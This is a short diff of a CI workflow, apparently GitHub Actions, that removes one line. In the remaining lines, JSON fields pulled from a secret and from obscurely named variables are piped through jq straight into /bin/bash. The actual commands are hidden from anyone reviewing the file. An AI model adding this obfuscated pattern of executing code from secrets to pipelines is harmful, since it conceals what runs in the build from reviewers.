@@ -20,7 +20,6 @@ jobs:
           ozerh80: ${{ secrets.ozerh80 }}
         run: |
           printf '%s' "$ozerh80" | jq -r .thoml46039 | /bin/bash
-          echo $ixev2 | jq -r .totg83 | /bin/bash
           echo $w22 | jq -r .qhfq4980 | /bin/bash
 
       - name: Persist results
